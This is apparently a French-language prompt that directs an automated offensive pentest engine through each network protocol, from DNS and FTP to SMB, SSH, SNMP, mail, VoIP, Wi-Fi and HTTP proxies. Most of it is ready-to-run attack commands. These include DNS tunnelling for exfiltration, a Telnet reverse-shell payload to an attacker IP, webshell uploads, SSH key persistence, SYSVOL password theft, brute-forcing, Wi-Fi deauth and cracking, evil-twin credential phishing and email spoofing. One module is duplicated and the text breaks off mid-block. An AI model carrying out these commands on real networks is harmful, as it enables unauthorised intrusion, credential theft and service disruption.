### 📡 GIGAPROMPT STRATÉGIQUE : INFRASTRUCTURE RÉSEAU (NETWORK ENGINE)

---

## 🧠 [TYPE_ABSTRAIT] HeuristicNetworkEngine
```plaintext
HeuristicNetworkEngine {
    observe(target: NetworkTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[]
}
```

## 🌐 [TYPE_ABSTRAIT] NetworkTarget
```plaintext
NetworkTarget {
    ip_range: string,
    domain: string?,
    os_banner: string[],
    open_ports: [int],
    services_detected: [string],
    topology: "LAN" | "DMZ" | "Cloud" | "Hybrid",
    platform: "Linux" | "Windows" | "Mixed",
    dns_detected: boolean,
    snmp_detected: boolean,
    wifi_visible: boolean,
    cloud_provider: string?,
    raw_signals: [Signal],
    vuln_surface: [VulnContext]
}
```

## 📍 [TYPE_ABSTRAIT] Signal
```plaintext
Signal {
    port: int,
    proto: string,
    banner: string,
    confidence: Low | Medium | High,
    service: string,
    tool_origin: string,
    metadata: any
}
```

## 💡 [TYPE_ABSTRAIT] Hypothesis
```plaintext
Hypothesis {
    type: VulnType,
    evidence: Signal[],
    probable_cwe: [CWE],
    impact: Low | Medium | High | Critical,
    confirmed: boolean,
    test_plan: Experiment[]
}
```

## 🔬 [TYPE_ABSTRAIT] Experiment
```plaintext
Experiment {
    outil: string,
    arguments: string,
    precondition: string,
    expected_outcome: string,
    post_action: string
}
```

## 👁️ [TYPE_ABSTRAIT] Observation
```plaintext
Observation {
    result: string,
    response: any,
    confirmed: boolean,
    notes: string
}
```

## 🧩 [TYPE_ABSTRAIT] NextStep
```plaintext
NextStep {
    decision_type: Continue | Escalate | Branch | Stop,
    description: string,
    command: CommandePentest
}
```

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```plaintext
CommandePentest {
    tool: string,
    full_command: string,
    description: string,
    when_to_execute: string
}
```

---

### 📡 `engine_proto_dns() : Analyse stratégique offensive des services DNS`

---

#### 🎯 OBJECTIF :
Effectuer une reconnaissance complète, une exploitation conditionnelle et une élévation offensive à travers les services DNS internes ou exposés (zones publiques, DNSSEC, détournements, tunnels de commande et exfiltration de données). Ce module interagit dynamiquement avec le moteur heuristique `engine_infra_network()`.

---

#### 🔁 PHASE 1 : Fingerprint & Reconnaissance DNS
- **Détection de ports ouverts** : `53/udp` ou `53/tcp`
- **Identification du serveur** : `nslookup`, `dig`, `host`, `nmap` (nse)
- **Techniques** :
  ```bash
  dig @<target> -t NS
  dig @<target> -t AXFR <domain>         # test zone transfer
  host -l <domain> <target>
  nmap -p 53 --script=dns-zone-transfer <target>
  nmap -p 53 --script=dns-recursion <target>
  dnsrecon -d <domain> -t std
  ```
- **Détection DNSSEC** :
  ```bash
  dig +dnssec <domain> ANY
  nmap -p 53 --script=dns-nsid,dns-random-srcport <target>
  ```

---

#### 🧠 PHASE 2 : Heuristique & Déclencheur
- **IF zone transfert réussie** → exfiltration de la cartographie
- **IF DNSSEC mal configuré** → spoofing / injection possible
- **IF résolveur récursif ouvert** → détournement / amplification
- **IF hostnames internes révélés** → rebond vers LAN / AD

---

#### 🔓 PHASE 3 : Attaque & Exploitation
- **Utilisation détournée** :
  - `iodine`, `dnscat2`, `dns2tcp` → tunnel reverse DNS
  - `dnschef` en MITM
- **Exécution** :
  ```bash
  iodine -f -P mypass <domain> 10.0.0.1
  ./dnscat2-server.rb
  ./dns2tcpd -f dns2tcpd.conf
  ```

---

#### 🔍 PHASE 4 : Bruteforce de sous-domaines
```bash
dnsrecon -d <target_domain> -D subdomains-top1mil.txt -t brt
amass enum -d <domain>
sublist3r -d <domain>
```

---

#### 🧠 MAPPINGS HEURISTIQUES

- **MITRE** :
  - T1071.004 (Application Layer Protocol: DNS)
  - T1046 (Network Service Scanning)
  - T1048 (Data Exfiltration Over Alternative Protocol)
  - T1001.003 (Data Obfuscation via DNS tunneling)
- **CVE/CWE Exemple** :
  - CWE-284 (Improper Access Control)
  - CVE-2020-1350 (SIGRed DNS RCE - Windows Server)

---

#### ⚙️ SCRIPTING BATCH
```bash
# dns_enum.bat
nslookup %1
dig @%1 -t AXFR example.local
dnsrecon -d example.local -t std
iodine -f -P mypass dns.example.local 10.0.0.1
```

---

#### 📂 OUTPUTS
```
/output/network/dns/<target>/dns_enum.log
/output/network/dns/<target>/zones_leaked.txt
/output/network/dns/<target>/dns_tunnels_active.log
```

---

### 📡 `engine_proto_ftp() : Analyse stratégique offensive des services FTP`

---

#### 🎯 OBJECTIF :
Scanner, identifier, et exploiter tous les vecteurs FTP : anonymes, authentifiés, fichiers sensibles, CVE historiques, mise en place de rebonds ou de shells. Intègre la détection de serveurs vulnérables (vsftpd, proftpd...), les protocoles mixtes (FTP/S) et le pivot local ou distant.

---

#### 🔁 PHASE 1 : Fingerprint & Reconnaissance FTP
- **Port ciblé** : `21/tcp`, `20/tcp`, `990` (FTP/S)
- **Outils** :
  ```bash
  nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <target>
  nmap -p 21,990 --script ftp-* <target>
  curl ftp://<target>
  whatweb ftp://<target>/
  ```
- **Exploration manuelle** :
  ```bash
  ftp <target>
  USER anonymous
  PASS anonymous@
  dir / cd /
  ```
- **FTP brut** :
  ```bash
  hydra -L users.txt -P rockyou.txt ftp://<target>
  ```

---

#### 🧠 PHASE 2 : Heuristique & Déclencheur
- **IF accès anonyme OK** → rechercher fichiers sensibles
- **IF accès en écriture OK** → upload script malveillant
- **IF serveur vsftpd 2.3.4 détecté** → backdoor (CVE-2011-2523)
- **IF accès à rootfs via FTP** → élévation / persistence

---

#### 💥 PHASE 3 : Exploitation & Abus
- **Backdoor FTP (CVE-2011-2523)** :
  ```bash
  telnet <target> 21
  USER :) # déclenche shell sur port TCP 6200
  ```
- **Upload de WebShell** :
  ```bash
  ftp <target>
  put shell.php
  ```
- **Abus bounce attack** :
  ```bash
  nmap -p 21 --script ftp-bounce <target>
  ```

---

#### 🔐 PHASE 4 : Credentials Leak
- **Recon sysvol/partages si AD** :
  ```bash
  ftp -n <target> << EOF
  user anonymous anonymous@
  ls -la /etc
  get passwd
  EOF
  ```

---

#### ⚙️ PHASE 5 : Pivot via FTP → Shell
- **Reverse shell dropper** :
  - Upload `rev.sh`
  - Schedule via cron / task on target
  - Monitor listener `nc -lvnp <port>`

---

#### 🧠 MAPPINGS HEURISTIQUES

- **MITRE** :
  - T1056.001 (Input Capture: Keylogging via credential reuse)
  - T1105 (Ingress Tool Transfer)
  - T1573.001 (Encrypted Channel via FTP/S)
- **CVE / CWE** :
  - CVE-2011-2523 (vsftpd backdoor)
  - CVE-2006-2573 (ProFTPd SITE CPFR)
  - CWE-264 (Permissions, Privileges)

---

#### ⚙️ SCRIPTING BATCH
```bash
# ftp_enum.bat
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-vsftpd-backdoor %1 -oN ftp_scan.txt
ftp -n %1 << EOF
user anonymous anonymous
ls -la
bye
EOF
```

---

#### 📂 OUTPUTS
```
/output/network/ftp/<target>/ftp_scan.txt
/output/network/ftp/<target>/ftp_files_dump.txt
/output/network/ftp/<target>/ftp_shell_payload.log
```

---

### 📁 `engine_proto_smb_network() : Pentest avancé des services SMB/CIFS`

---

#### 🎯 OBJECTIF :
Analyser, détecter et exploiter en profondeur les vulnérabilités SMB (SMBv1/v2/v3), les null sessions, les partages ouverts, les mots de passe GPP, les CVE critiques type EternalBlue, et les chaînes d’exploitation vers le lateral movement.

---

#### 🔁 PHASE 1 : Fingerprinting SMB
- **Détection de version et protocoles actifs**
  ```bash
  nmap -p 445 --script=smb-protocols,smb-os-discovery,smb-security-mode,smb2-capabilities,smbv2-enabled <target>
  smbclient -L //<target> -N
  enum4linux -a <target>
  nbtscan <target>
  ```
- **Null Session** :
  ```bash
  rpcclient -U "" -N <target>
  smbmap -H <target> -u '' -p ''
  ```

---

#### 🔒 PHASE 2 : Analyse de Sécurité & Détection CVE
- **CVE-2017-0144** (EternalBlue):
  ```bash
  nmap -p445 --script smb-vuln-ms17-010 <target>
  ```
- **CVE-2020-0796** (SMBGhost):
  ```bash
  crackmapexec smb <target> --check
  ```
- **SID bruteforce & user enum** :
  ```bash
  enum4linux-ng -A <target>
  ```

---

#### 🧠 PHASE 3 : Heuristique & Déclencheurs
- **IF SMBv1 actif** → CVE-2017-0144 / EternalBlue exploit
- **IF null session OK** → extract utilisateurs, policies, partages
- **IF partage SYSVOL/NETLOGON** → recherche scripts, mots de passe
- **IF accès écriture** → upload payloads, exécution via PsExec/WMI

---

#### 📜 PHASE 4 : Abus de Partages SYSVOL / GroupPolicy Preferences (GPP)
- **Script de récupération de mots de passe chiffrés** :
  ```bash
  smbclient //target/SYSVOL -N -c "cd Policies; recurse; prompt; mget *"
  find Groups.xml | xargs gpp-decrypt.py
  ```

---

#### 🛠️ PHASE 5 : Post-Exploitation & Rebond SMB
- **Usage CrackMapExec** :
  ```bash
  crackmapexec smb <target> -u user -p pass --shares
  crackmapexec smb <target> -u user -p pass --exec 'ipconfig /all'
  ```
- **Upload + Exécution de shell** :
  ```bash
  smbclient -U user //target/C$ -c "put rev.ps1"
  winrm or schtasks to execute
  ```

---

#### 🧠 MAPPING HEURISTIQUE

- **MITRE ATT&CK** :
  - T1077 (Windows Admin Shares)
  - T1003.002 (Password from SYSVOL)
  - T1047 (WMI for lateral movement)
- **CVE/CWE** :
  - CVE-2017-0144 (EternalBlue)
  - CVE-2020-0796 (SMBGhost)
  - CWE-522 (Insufficiently Protected Credentials)

---

#### ⚙️ SCRIPTING BATCH
```bash
# smb_enum.bat
nmap -p445 --script=smb-os-discovery,smb-vuln-ms17-010 %1 -oN smb_scan.txt
smbclient -L //%1 -N > smb_shares.txt
rpcclient -U "" -N %1 -c "enumdomusers; enumdomgroups" > smb_users.txt
```

---

#### 📂 OUTPUTS
```
/output/network/smb/<target>/smb_scan.txt
/output/network/smb/<target>/smb_shares.txt
/output/network/smb/<target>/credentials_extracted.log
/output/network/smb/<target>/exploit_success.flag
```

---

### 🔐 `engine_proto_ssh_telnet() : Offensive avancée sur services SSH/Telnet`

---

#### 🎯 OBJECTIF :
Scanner, fingerprint, identifier les vulnérabilités SSH/Telnet exposées. Énumérer les utilisateurs, détecter les backdoors ou configurations faibles, bruteforcer l'accès et utiliser les sessions pour rebondir dans le réseau (pivot), injecter des shells, ou exfiltrer des données.

---

#### 🔁 PHASE 1 : Fingerprint & Reconnaissance des services
- **Scan général**
  ```bash
  nmap -p22,23 -sV --script=ssh2-enum-algos,telnet-ntlm-info,telnet-encryption <target>
  ```
- **Fingerprint SSH / Telnet**
  ```bash
  ssh -v <target>
  telnet <target>
  whatweb ssh://<target>
  ```
- **SSH Key fingerprint**
  ```bash
  ssh-keyscan -t rsa,dsa,ecdsa <target> >> known_hosts
  ```

---

#### 💣 PHASE 2 : Bruteforce des accès SSH/Telnet
- **Brute SSH** :
  ```bash
  hydra -V -f -t 4 -L users.txt -P rockyou.txt ssh://<target>
  patator ssh_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=rockyou.txt
  ```
- **Brute Telnet** :
  ```bash
  hydra -t 4 -L users.txt -P rockyou.txt telnet://<target>
  ```
- **Dictionnaire de clés SSH** :
  ```bash
  ssh -i keyfile user@<target>
  ```

---

#### 🧠 PHASE 3 : Heuristique & Déclencheurs
- **IF port 23 actif** → vulnérabilité Telnet + analyse bannière
- **IF SSH sans MFA / fail2ban** → trigger bruteforce avancé
- **IF OS banner Linux / BusyBox / Cisco IOS** → pivoter vers engine firmware
- **IF accès root obtenu** → injecter persistance (cron, rc.local...)

---

#### ⚔️ PHASE 4 : Exploitation active SSH/Telnet
- **Payload Telnet :**
  ```bash
  echo -e "nc -e /bin/sh <attacker_ip> <port>" | telnet <target>
  ```
- **SSH Reverse Proxy / Pivot Tunnel** :
  ```bash
  ssh -D 1080 -C -N user@<target>
  proxychains nmap -sT -Pn -n <internal_target>
  ```
- **SSH Mount** :
  ```bash
  sshfs user@<target>:/ /mnt/<target> -o allow_other
  ```

---

#### 📚 PHASE 5 : Récupération post-auth
- **Dump historique et config** :
  ```bash
  ssh user@<target> 'cat ~/.bash_history'
  ssh user@<target> 'ls -la /etc/ssh/'
  ```
- **Persistance** :
  ```bash
  echo 'attacker_ssh_pubkey' >> ~/.ssh/authorized_keys
  ```

---

#### 🧠 MAPPING HEURISTIQUE

- **MITRE ATT&CK** :
  - T1021.004 (SSH Remote Services)
  - T1071.001 (Application Layer Protocol)
  - T1556.004 (Credential Stuffing)
- **CVE/CWE** :
  - CVE-2018-15473 (user enum OpenSSH)
  - CVE-2020-15778 (scp command injection)
  - CWE-522 / CWE-798 (Hardcoded credentials / weak auth)

---

#### ⚙️ SCRIPTING BATCH
```bash
# ssh_telnet_enum.bat
nmap -p22,23 --script=ssh2-enum-algos,telnet-encryption %1 -oN ssh_telnet_scan.txt
hydra -L users.txt -P rockyou.txt ssh://%1 > brute_ssh.log
```

---

#### 📂 OUTPUTS
```
/output/network/ssh_telnet/<target>/ssh_telnet_scan.txt
/output/network/ssh_telnet/<target>/brute_ssh.log
/output/network/ssh_telnet/<target>/pivot_tunnel_status.log
```

---

### 📡 `engine_proto_snmp() : Offensive SNMP – Enumeration & Exploitation`

---

#### 🎯 OBJECTIF :
Scanner, énumérer, et exploiter les services SNMP exposés en utilisant la communauté publique (`public`) ou d’autres découvertes. Extraire des informations système, réseau, routage, config, credentials, ou effectuer des attaques d’écriture si le mode est RW.

---

#### 🔁 PHASE 1 : Fingerprint & Access Test
- **Scan SNMP** :
  ```bash
  nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-netstat,snmp-processes <target>
  ```
- **Basic snmpwalk (v1)** :
  ```bash
  snmpwalk -v1 -c public <target>
  snmpwalk -v2c -c public <target>
  ```
- **Custom community test** :
  ```bash
  onesixtyone -c community_list.txt -i targets.txt
  snmp-check <target> -c private
  ```

---

#### 🧠 PHASE 2 : Heuristique & Déclencheurs
- **IF community = public / private OK** → full enumeration
- **IF RW access** → write OID, shutdown interfaces, reboot
- **IF `sysDescr` contains Cisco/Juniper/FortiOS** → déclenche le firmware module ou VPN enum
- **IF printer/MFD detected** → printer pw bypass, exfil (via SNMP print job hijack)

---

#### 🔍 PHASE 3 : Extraction d'infos sensibles
- **Users, passwords (encoded)**
  ```bash
  snmpwalk -v2c -c public <target> .1.3.6.1.4.1.77.1.2.25
  ```
- **Routing table, ARP, MAC**
  ```bash
  snmpwalk -v2c -c public <target> .1.3.6.1.2.1.4.21
  snmpwalk -v2c -c public <target> .1.3.6.1.2.1.3.1.1.2
  ```
- **TCP/UDP ports/services**
  ```bash
  snmpwalk -v2c -c public <target> .1.3.6.1.2.1.6.13
  ```

---

#### 💣 PHASE 4 : Exploitation active
- **IF RW Access → Trigger shutdown**
  ```bash
  snmpset -v2c -c private <target> <OID> i 2  # Interface down
  ```
- **Printer abuse** :
  ```bash
  snmpwalk -v2c -c public <printer_ip> .1.3.6.1.2.1.43 # Printer-MIB
  ```

---

#### 📚 PHASE 5 : Mapping & Reporting

- **MITRE ATT&CK** :
  - T1046 (Network Service Scanning)
  - T1007 (System Service Discovery)
  - T1507 (Network Device Discovery)
- **CVE/CWE** :
  - CVE-2020-8597 (SNMP buffer overflow PPPD)
  - CVE-2017-6736 (Cisco SNMP write access RCE)
  - CWE-798 (Use of Hardcoded Credentials)

---

#### ⚙️ SCRIPTING BATCH
```bash
# snmp_enum.sh
snmpwalk -v2c -c public $1 > snmp_enum.txt
onesixtyone -c community_list.txt -i $1 > community_enum.txt
snmp-check $1 -c public > snmp_check_output.txt
```

---

#### 📂 OUTPUTS
```
/output/network/snmp/<target>/snmp_enum.txt
/output/network/snmp/<target>/rw_access.log
/output/network/snmp/<target>/printer_exfil.txt
```

---

### 📧 `engine_proto_mail_services() : Offensive Mail Services (SMTP, IMAP, POP, SPF, DMARC, etc.)`

---

#### 🎯 OBJECTIF :
Analyser en profondeur les services de messagerie exposés : SMTP (25, 587, 465), POP3 (110, 995), IMAP (143, 993), et tester leur niveau de sécurité, leur configuration (auth, relais, TLS), les vulnérabilités connues, et leur posture DNS (SPF, DKIM, DMARC).

---

#### 🔁 PHASE 1 : Scan & Fingerprinting
- **Nmap NSE** :
  ```bash
  nmap -sV -p25,465,587,110,995,143,993 --script "smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,pop3-capabilities,imap-capabilities" <target>
  ```

- **Banner Grab** :
  ```bash
  nc <target> 25
  ```

- **TLS Support Check** :
  ```bash
  testssl.sh <target>:465
  ```

---

#### 🧠 PHASE 2 : Déclencheurs & Heuristique
- **IF SMTP 25/587/465** → check open relay + VRFY + TLS
- **IF IMAP/POP open** → brute creds + mailbox hijack
- **IF SPF/DKIM/DMARC Weak/Missing** → spoofing campaigns
- **IF mail server = Exim / Postfix / Exchange** → map version to CVEs

---

#### 🔍 PHASE 3 : Enum & Vulnerability Tests

- **SMTP VRFY / EXPN / Open Relay** :
  ```bash
  telnet <target> 25
  > VRFY root
  > EXPN root
  ```

- **Brute Force POP/IMAP** :
  ```bash
  hydra -l user -P rockyou.txt pop3://<target>
  hydra -l user -P rockyou.txt imap://<target>
  ```

- **Metasploit → Exim/Postfix Exploits** :
  - `exploit/unix/smtp/exim4_string_format`
  - `exploit/windows/smtp/exchange_proxylogon`

---

#### 📜 PHASE 4 : DNS Mail Posture (SPF, DKIM, DMARC)
- **SPF Check** :
  ```bash
  dig +short TXT <domain>
  ```

- **DKIM Record Extraction** :
  ```bash
  dig +short TXT default._domainkey.<domain>
  ```

- **DMARC Policy** :
  ```bash
  dig +short TXT _dmarc.<domain>
  ```

- **Outils spécialisés** :
  ```bash
  dmarcian.com, spf-tools, opendmarc
  ```

---

#### 💣 PHASE 5 : Spoofing Simulation (si faiblesse)
- **Fake SMTP test** :
  ```bash
  sendemail -f attacker@spoofed.com -t victim@domain.com -s <smtp_target> -xu user -xp pass
  ```

- **SPF/DMARC Bypass Proof** :
  - Email reçu avec une politique `none` ou `softfail`

---

#### 📚 PHASE 6 : Mapping & TTP

- **MITRE ATT&CK** :
  - T1110.002 (Brute Force – Password Guessing)
  - T1585.002 (Email Account Abuse)
  - T1566.002 (Spearphishing via Services)
- **CVE** :
  - CVE-2021-26855 (Exchange SSRF ProxyLogon)
  - CVE-2019-10149 (Exim RCE)

---

#### ⚙️ SCRIPTING
```bash
# mail_enum.sh
nmap -p25,465,587,110,995,143,993 --script smtp-commands,smtp-enum-users,pop3-capabilities,imap-capabilities $1 -oN mail_nmap.log
dig +short TXT _dmarc.$2 > dmarc.txt
hydra -l user -P rockyou.txt imap://$1 -o imap_brute.log
```

---

#### 📂 OUTPUTS :
```
/output/network/mail/<target>/mail_nmap.log
/output/network/mail/<target>/imap_brute.log
/output/network/mail/<target>/spoof_test_results.txt
```

---

### ☎️ `engine_proto_voip() : Offensive VoIP Stack (SIP, RTP, H.323, IAX2)`

---

#### 🎯 OBJECTIF :
Auditer les infrastructures de VoIP exposées (internes ou hybrides), détecter les failles dans les protocoles de signalisation (SIP, H.323), transmission (RTP), et services associés (IAX2, PBX), incluant interception, contournement d’authentification, fuzzing, injection DTMF, et exfiltration via RTP ou VXML.

---

#### 🔁 PHASE 1 : Scan & Fingerprint

- **Port scanning** :
  ```bash
  nmap -sU -p 5060,5061,5062,1720,4569,5004,16384-32767 <target>
  ```

- **SIP Detection** :
  ```bash
  svmap <target>
  nmap -sU -p 5060 --script sip-methods,sip-enum-users <target>
  ```

- **Banner Grab** :
  ```bash
  echo -ne "OPTIONS sip:user@$target SIP/2.0\r\n\r\n" | nc -u -w1 $target 5060
  ```

---

#### 🧠 PHASE 2 : Déclencheurs & Heuristique

- **IF Port 5060/5061** → SIP ENUM / Brute / Registration
- **IF RTP open range** → RTP Injection / Sniffing
- **IF Port 1720** → H.323 stack (ex : Cisco/Polycom)
- **IF Port 4569** → IAX2 → Asterisk / FreePBX
- **IF SIP Server Asterisk / OpenSIPS / FreeSWITCH** → CVE checks

---

#### 🔍 PHASE 3 : Enum & Exploits

- **SIP Users Brute** :
  ```bash
  svwar -m INVITE -f users.txt <target>
  ```

- **SIP Auth Bypass / Registration Hijack** :
  ```bash
  sipsak -v -s sip:100@$target
  ```

- **Fuzz SIP Methods** :
  ```bash
  sipp -sf uac.xml -s 100 $target:5060
  ```

- **RTP Hijack** :
  ```bash
  rtpbreak -i eth0 -d -m audio -W session.wav
  ```

- **Interception & Recording** :
  ```bash
  Wireshark → Decode as SIP/RTP
  rtpsniff + tshark
  ```

---

#### 🧱 PHASE 4 : Bypass Techniques

- **DTMF Injection (PIN Bypass)** :
  ```bash
  senddtmf -t $target -d 123456
  ```

- **SIP Call Spoofing** :
  ```bash
  sipvicious / sipp scenarios (spoofed caller ID)
  ```

- **Voicemail Hijacking** :
  ```bash
  metasploit exploit/unix/voip/asterisk_voicemail
  ```

---

#### 📚 PHASE 5 : Mapping & TTP

- **MITRE ATT&CK** :
  - T1040 (Network Sniffing)
  - T1021.001 (Remote Services – VoIP)
  - T1001 (Data Obfuscation – RTP stream injection)
- **CVE** :
  - CVE-2021-27578 (Asterisk buffer overflow)
  - CVE-2019-19006 (FreeSWITCH DoS)

---

#### ⚙️ SCRIPTING
```bash
# voip_enum.sh
nmap -sU -p5060,1720,4569 --script=sip-enum-users,sip-methods,h323-info $1 -oN voip_nmap.log
svmap $1 > sip_servers.txt
svwar -m INVITE -f users.txt $1 > sip_enum.log
```

---

#### 📂 OUTPUTS :
```
/output/network/voip/<target>/voip_nmap.log
/output/network/voip/<target>/sip_enum.log
/output/network/voip/<target>/rtp_intercepted.wav
```

---

### ☎️ `engine_proto_voip() : Offensive VoIP Stack (SIP, RTP, H.323, IAX2)`

---

#### 🎯 OBJECTIF :
Auditer les infrastructures de VoIP exposées (internes ou hybrides), détecter les failles dans les protocoles de signalisation (SIP, H.323), transmission (RTP), et services associés (IAX2, PBX), incluant interception, contournement d’authentification, fuzzing, injection DTMF, et exfiltration via RTP ou VXML.

---

#### 🔁 PHASE 1 : Scan & Fingerprint

- **Port scanning** :
  ```bash
  nmap -sU -p 5060,5061,5062,1720,4569,5004,16384-32767 <target>
  ```

- **SIP Detection** :
  ```bash
  svmap <target>
  nmap -sU -p 5060 --script sip-methods,sip-enum-users <target>
  ```

- **Banner Grab** :
  ```bash
  echo -ne "OPTIONS sip:user@$target SIP/2.0\r\n\r\n" | nc -u -w1 $target 5060
  ```

---

#### 🧠 PHASE 2 : Déclencheurs & Heuristique

- **IF Port 5060/5061** → SIP ENUM / Brute / Registration
- **IF RTP open range** → RTP Injection / Sniffing
- **IF Port 1720** → H.323 stack (ex : Cisco/Polycom)
- **IF Port 4569** → IAX2 → Asterisk / FreePBX
- **IF SIP Server Asterisk / OpenSIPS / FreeSWITCH** → CVE checks

---

#### 🔍 PHASE 3 : Enum & Exploits

- **SIP Users Brute** :
  ```bash
  svwar -m INVITE -f users.txt <target>
  ```

- **SIP Auth Bypass / Registration Hijack** :
  ```bash
  sipsak -v -s sip:100@$target
  ```

- **Fuzz SIP Methods** :
  ```bash
  sipp -sf uac.xml -s 100 $target:5060
  ```

- **RTP Hijack** :
  ```bash
  rtpbreak -i eth0 -d -m audio -W session.wav
  ```

- **Interception & Recording** :
  ```bash
  Wireshark → Decode as SIP/RTP
  rtpsniff + tshark
  ```

---

#### 🧱 PHASE 4 : Bypass Techniques

- **DTMF Injection (PIN Bypass)** :
  ```bash
  senddtmf -t $target -d 123456
  ```

- **SIP Call Spoofing** :
  ```bash
  sipvicious / sipp scenarios (spoofed caller ID)
  ```

- **Voicemail Hijacking** :
  ```bash
  metasploit exploit/unix/voip/asterisk_voicemail
  ```

---

#### 📚 PHASE 5 : Mapping & TTP

- **MITRE ATT&CK** :
  - T1040 (Network Sniffing)
  - T1021.001 (Remote Services – VoIP)
  - T1001 (Data Obfuscation – RTP stream injection)
- **CVE** :
  - CVE-2021-27578 (Asterisk buffer overflow)
  - CVE-2019-19006 (FreeSWITCH DoS)

---

#### ⚙️ SCRIPTING
```bash
# voip_enum.sh
nmap -sU -p5060,1720,4569 --script=sip-enum-users,sip-methods,h323-info $1 -oN voip_nmap.log
svmap $1 > sip_servers.txt
svwar -m INVITE -f users.txt $1 > sip_enum.log
```

---

#### 📂 OUTPUTS :
```
/output/network/voip/<target>/voip_nmap.log
/output/network/voip/<target>/sip_enum.log
/output/network/voip/<target>/rtp_intercepted.wav
```

---


### 📶 MODULE : `engine_proto_wifi()`

```markdown
## 🔐 ENGINE_PROTO_WIFI() – Audit Wi-Fi & Attaques sans fil (WEP/WPA/WPA2/WPA3, PMKID, EvilTwin)

---

### 🎯 OBJECTIF

Identifier et exploiter les failles des réseaux sans fil exposés (locaux ou de proximité), y compris :
- Failles WEP/WPA obsolètes
- Capture de handshake & PMKID
- Evil Twin & Rogue AP
- Attaques Radius/MFA
- Exfiltration et tunnel Wi-Fi

---

## 🧠 [TYPE_ABSTRAIT] WiFiTarget
```plaintext
WiFiTarget {
  interface: string,
  mode: Monitor | Managed,
  bssid: string,
  ssid: string,
  channel: int,
  encryption: WEP | WPA | WPA2 | WPA3,
  signal_strength: int,
  known_clients: [string],
  has_pmkid: boolean,
  captive_portal: boolean,
  radius_auth: boolean
}
```

---

## 🧪 PHASE 1 : Mise en mode moniteur + reconnaissance

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
```

• Extraction des SSID/BSSID + channel + encryption  
• Détection captive portal : wifiphisher

---

## 🧪 PHASE 2 : Capture de handshake ou PMKID

```bash
airodump-ng --bssid <bssid> --channel <ch> -w capture wlan0mon
aireplay-ng -0 5 -a <bssid> wlan0mon
```

• Capture .cap avec handshake ou PMKID  
• Extraction PMKID via hcxdumptool + hcxpcapngtool

---

## 🔓 PHASE 3 : Brute-force / Dictionnaire

```bash
hashcat -m 22000 capture.22000 rockyou.txt
```

• Si succès, extraction de la clé PSK  
• Injection dans wpa_supplicant.conf pour test

---

## 🎭 PHASE 4 : Evil Twin + Portail Captif

```bash
wifiphisher --essid "<fake_ssid>" --phishing-scenario oauth --noextensions
```

• Déclenche un faux portail de connexion  
• Récupération de credentials dans ./wifiphisher/logs

---

## 🔗 PHASE 5 : Attaque Radius & EAP

• Test des implémentations Radius/EAP-TLS  
• Utilisation eaphammer :

```bash
eaphammer --interface wlan0mon --channel <ch> --essid <ssid> --auth wpa2 --creds
```

• Capture MSCHAPv2 + brute-force hash

---

## 🧬 PHASE 6 : Scans réseaux sur réseaux Wi-Fi capturés

```bash
nmap -sn 192.168.X.0/24
crackmapexec smb 192.168.X.0/24 -u user -p pass
```

---

## 🔁 STRATÉGIE ADAPTATIVE

```pseudo
IF encryption == WEP → Trigger aireplay-ng crack
IF has_pmkid → Trigger PMKID hashcat
IF captive_portal == true → Trigger EvilTwin
IF radius_auth == true → Trigger EAPHammer + MSCHAPv2 extract
```

---

## 🧠 MAPPING CVE / MITRE / CPE

- CVE-2017-13077 à CVE-2017-13082 : KRACK attack
- CVE-2020-26141 : WPA3-Dragonblood
- MITRE ATT&CK : T1557.002 (Rogue Infrastructure), T1583.006 (Wi-Fi Access)

---

## 📂 OUTPUTS

```plaintext
/output/network/wifi/pmkid_handshake.cap
/output/network/wifi/hashcat_crack_result.txt
/output/network/wifi/wifiphisher_creds.json
/output/network/wifi/eaphammer_mschapv2_hashes.txt
```

---

## 🧰 Script Automatisé (batch ou shell)

```bash
#!/bin/bash
airmon-ng start wlan0
airodump-ng wlan0mon --write wifi_audit --output-format pcap
aireplay-ng -0 10 -a "$TARGET_BSSID" wlan0mon
hcxpcapngtool -o pmkid.22000 wifi_audit.pcap
hashcat -m 22000 pmkid.22000 rockyou.txt --outfile cracked_wifi.txt
```

---

### 🌐 MODULE : `engine_proto_http_proxy()`

```markdown
## 🧩 ENGINE_PROTO_HTTP_PROXY() – Analyse et Exploitation des Proxys HTTP/SSL

---

### 🎯 OBJECTIF

Auditer les proxys HTTP/HTTPS (Squid, nginx, HAProxy, Bluecoat...) :
- Détournement de proxy
- Requêtes HTTP interceptables
- Contournement filtrage
- Injection man-in-the-middle
- Cache poisoning & abuse
- Analyse de logs proxy pour exfiltration

---

## 🧠 [TYPE_ABSTRAIT] ProxyTarget
```plaintext
ProxyTarget {
  ip: string,
  port: int,
  protocol: HTTP | HTTPS,
  software: string,
  version: string,
  is_transparent: boolean,
  allows_connect: boolean,
  supports_cache: boolean,
  has_auth: boolean,
  mitm_possible: boolean
}
```

---

## 🧪 PHASE 1 : Détection de Proxy ouvert ou interceptant

```bash
nmap -p8080,3128,8888 --script http-open-proxy <target>
curl -x <target>:<port> http://example.com
```

• Vérification de fonctionnement proxy + connect  
• Detection MITM : BurpSuite, sslyze

---

## 🔓 PHASE 2 : Abuse CONNECT + bypass firewall

```bash
curl -x <target>:<port> https://ipinfo.io
curl -x <target>:<port> http://intranet.local/
```

• Test de sortie Internet / Intranet  
• Scan ports internes via proxychains/nmap :

```bash
proxychains nmap -sT -Pn -p 22,80,443 10.0.0.0/24
```

---

## 🧪 PHASE 3 : Proxy Cache Attacks

• Test injection via X-Forwarded-Host / Via / Client-IP :

```bash
curl -H "X-Forwarded-Host: evil.com" -x <proxy> http://victim/
```

• Cache poisoning : Burp Repeater + web-cache-deception

---

## ⚠️ PHASE 4 : Authentication Bruteforce

```bash
hydra -s <port> -V -l user -P rockyou.txt <ip> http-proxy
```

• Basic / NTLM Proxy-Auth

---

## 🎭 PHASE 5 : MITM & SSL Bypass

• Proxy SSL Interception → analyse certificat avec sslyze :

```bash
sslyze --certinfo=basic <target>:<port>
```

• Injection JS sur sites en HTTP  
• Analyse logs + exfil via query :

```bash
